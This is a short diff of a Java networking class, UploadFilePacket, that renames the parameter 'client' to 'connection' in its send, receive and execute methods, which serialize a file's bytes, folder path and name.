@@ -28,27 +28,27 @@ public final class UploadFilePacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveConnection client) {
-		client.writeInt(data.length);
-		client.write(data);
-		client.writeUTF(folderPath);
-		client.writeUTF(fileName);
+	public void send(final ActiveConnection connection) {
+		connection.writeInt(data.length);
+		connection.write(data);
+		connection.writeUTF(folderPath);
+		connection.writeUTF(fileName);
 	}
 	
 	@Override
-	public void receive(final ActiveConnection client) {
-		final int length = client.readInt();
+	public void receive(final ActiveConnection connection) {
+		final int length = connection.readInt();
 		
 		data = new byte[length];
 		
-		client.read(data);
+		connection.read(data);
 		
-		folderPath = client.readUTF();
-		fileName = client.readUTF();
+		folderPath = connection.readUTF();
+		fileName = connection.readUTF();
 	}
 	
 	@Override
-	public void execute(final ActiveConnection client) {
+	public void execute(final ActiveConnection connection) {
 		final File folder = new File(folderPath);
 		
 		String path = null;
